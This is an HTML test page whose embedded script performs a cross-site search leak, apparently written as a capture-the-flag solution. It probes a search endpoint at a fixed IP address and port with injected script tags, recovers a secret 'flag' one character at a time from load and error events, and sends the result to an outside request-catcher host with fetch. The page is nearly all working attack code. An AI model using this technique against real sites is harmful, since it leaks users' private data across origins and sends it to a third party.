<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Test</title>

</head>
<body>
    <script>
        const chars =
          "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        let flag = "B";
        const target = "178.128.37.153:30039"
        const payload = `http://${target}/api/entries/search?q=`;
    
        function addScript(c) {
          return new Promise((resolve, reject) => {
            const script = document.createElement("script");
            script.src = `${payload}${encodeURIComponent(flag + c)}`
            script.onload = () => resolve(c);
            script.onerror = () => reject(c);
    
            document.head.appendChild(script);
          });
        }
    
        async function getFlag() {
          for (let i = 0; i < 5; i++) {
            let found = false;
            for (c of chars) {
                try {
                    const fragment = await addScript(c)
                    flag = flag + fragment
                    found = true
                    break
                } catch (e) {}
            }
            if (!found) {
                break
            }
          }
          fetch(`https://test.requestcatcher.com?q=${flag}`);
        }

        getFlag()
      </script>
</body>
</html>
